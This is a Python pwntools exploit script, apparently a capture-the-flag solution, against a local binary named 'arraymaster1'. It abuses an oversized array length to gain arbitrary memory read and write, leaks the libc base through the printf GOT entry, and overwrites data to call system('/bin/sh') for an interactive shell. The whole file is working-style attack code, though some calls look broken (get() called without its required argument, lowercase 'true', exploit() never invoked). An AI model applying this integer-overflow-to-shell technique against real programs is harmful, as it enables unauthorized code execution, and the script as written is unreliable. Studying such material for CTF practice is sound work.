from pwn import *

context.binary = "./arraymaster1"
p = process("./arraymaster1")

def init(id, type, length):
    p.sendlineafter("\n> ", "init {} {} {}".format(id, type, length))

def get(id, index, noreturn):
    p.sendlineafter("\n> ", "get {} {}".format(id, index))
    if not noreturn: return p.recvline()

def set(id, index, value):
    p.sendlineafter("\n ", "set {} {} {}".format(id, index,value))

def get_arbitary_RW():
    global B_base
    init("A", 64, 2305843089213693953)
    init("B", 64, 8)
    set("B", 0, "0x4141414141414141")
    i = 0
    while get("A" ,i) != "0x4141414141414141": i+=1
    B_base = i - 6

def read8(where):
    set("A", B_base+2, where)
    return get("B", 0)

def write8(where, what):
    set("A", B_base+2, where)
    set("B", 0, what)

def leak_libc():
    global libc 
    printf = read8(context.binary.sym.got.printf)
    libc = ELF("./libc-2.27.so")
    libc.address += (printf-libc.sym.printf)
    
def got_shell():
    set("A", B_base, "0x0068732f6e69622f")
    set("B", B_base+3, libc.sym.system)
    get("B", 0, noreturn=true)
    p.interactive()

def exploit():
    get_arbitary_RW()
    leak_libc()
    got_shell() 



















